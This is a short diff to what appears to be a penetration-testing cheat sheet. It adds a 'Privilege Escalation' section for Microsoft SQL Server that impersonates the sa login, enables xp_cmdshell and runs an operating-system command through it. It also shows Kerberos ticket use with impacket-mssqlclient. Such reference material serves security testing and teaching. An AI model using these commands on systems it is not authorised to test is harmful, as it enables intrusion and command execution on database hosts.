@@ -69,6 +69,14 @@ $ export KRB5CCNAME=<USERNAME>.ccache
 $ impacket-mssqlclient -k <RHOST>.<DOMAIN>
 ```
 
+### Privilege Escalation
+
+```c
+SQL> exec_as_login sa
+SQL> enable_xp_cmdshell
+SQL> xp_cmdshell whoami
+```
+
 ## MongoDB
 
 ### Client Installation
